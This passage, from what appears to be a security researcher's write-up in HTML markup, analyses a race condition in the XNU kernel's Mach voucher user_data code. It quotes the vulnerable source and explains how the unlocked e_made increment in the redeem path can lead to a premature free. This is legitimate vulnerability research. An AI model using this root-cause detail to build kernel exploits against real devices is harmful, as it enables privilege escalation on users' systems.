class="BGLtzooHlW-c11"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;which this &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;has a pointer to in its &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;field, but before that thread had looked up this &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;and taken a reference. That&amp;#39;s exactly the window another thread needs to hit where it&amp;#39;s not correct for this thread to free its &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;, despite our &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_refs&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;being 0.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="BGLtzooHlW-c18 BGLtzooHlW-c5" id="h.9t2rft5xjjjf"&gt;&lt;span class="BGLtzooHlW-c20"&gt;The bug&lt;/span&gt;&lt;/h2&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Hopefully the significance of the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;field is now clear. It&amp;#39;s not exactly a reference count; in fact it only exists as a kind of band-aid to work around what should be in practice a very rare race condition. But, if its value was wrong, bad things could happen if you tried :)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is only modified in two places: Firstly, in &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_dedup&lt;/span&gt;&lt;span&gt;&amp;nbsp;when a matching &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;is found in the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_bucket&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;hash table:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.484d8847b8af9875d2025d95cd2485b68892c7b1"&gt;&lt;/a&gt;&lt;a id="t.54"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* ... we found a match... */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; elem&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;e_made&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;++;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_unlock&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;();&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;The only other place is in &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_get_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;when handling the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;command during recipe parsing:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.3c0876f1c62007cdc6321660fe4a6fcf553a111c"&gt;&lt;/a&gt;&lt;a id="t.55"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;switch&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;command&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;case&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* redeem of previous values is the value */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;lt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;prev_value_count&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; elem &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;user_data_element_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;prev_values&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;];&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;assert&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;lt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;e_made&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; elem&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;e_made&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;++;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;out_value &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;prev_values&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;];&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;KERN_SUCCESS&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* redeem of default is default */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;out_value &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;KERN_SUCCESS&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;As mentioned before, it&amp;#39;s up to the attr managers themselves to define the semantics of redeeming a voucher; the entirety of the user_data semantics for voucher redemption are shown above. It simply returns the previous value, with &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;incremented by 1. Recall that &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;*prev_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;is either the value which was previously in this under-construction voucher for this key, or the value in the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;prev_voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;referenced by this sub-recipe.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;If you can&amp;#39;t spot the bug above in the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span&gt;&amp;nbsp;code right away that&amp;#39;s because it&amp;#39;s a bug of omission; it&amp;#39;s what&amp;#39;s &lt;/span&gt;&lt;span class="BGLtzooHlW-c17"&gt;not&lt;/span&gt;&lt;span&gt;&amp;nbsp;there that causes the vulnerability, namely that the increment in the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span&gt;&amp;nbsp;case isn&amp;#39;t protected by the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;lock! This increment isn&amp;#39;t atomic.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;That means that if the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span&gt;&amp;nbsp;code executes in parallel with either itself on another thread or the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;elem-&amp;gt;e_made++&lt;/span&gt;&lt;span&gt;&amp;nbsp;increment in &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_dedup&lt;/span&gt;&lt;span&gt;&amp;nbsp;on another thread, the two threads can both see the same initial value for &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;, both add one then both write the same value back; incrementing it by one when it should have been incremented by two.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;But remember, &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;isn&amp;#39;t a reference count! So actually making something bad happen isn&amp;#39;t as simple as just getting the two threads to align such that their increments overlap so that &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;is wrong.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Let&amp;#39;s think back to what the purpose of &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is: it exists solely to ensure that if thread A drops the last ref on an &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;whilst thread B is exactly in the race window shown below, that thread&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;doesn&amp;#39;t free &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;new_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;on thread B&amp;#39;s stack:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.6678b43a7a459c004d346e8b4b835a591c986cfd"&gt;&lt;/a&gt;&lt;a id="t.56"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivam&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivam_get_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)(&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivam&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;key&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;command&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; previous_vals&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;previous_vals_count&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; content&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;new_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;new_flag&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;new_value_voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;!=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_release&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;...&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* WINDOW */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; val_index &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivace_reference_by_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;new_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;new_flag&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;And the reason the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;doesn&amp;#39;t get freed by thread A is because in that window, &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;will always be &lt;/span&gt;&lt;span class="BGLtzooHlW-c17"&gt;larger&lt;/span&gt;&lt;span&gt;&amp;nbsp;than the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace-&amp;gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;value for any &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;which has a pointer to that &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is larger because the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;increment always happens &lt;/span&gt;&lt;span class="BGLtzooHlW-c17"&gt;before&lt;/span&gt;&lt;span&gt;&amp;nbsp;any &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_made&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;increment.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 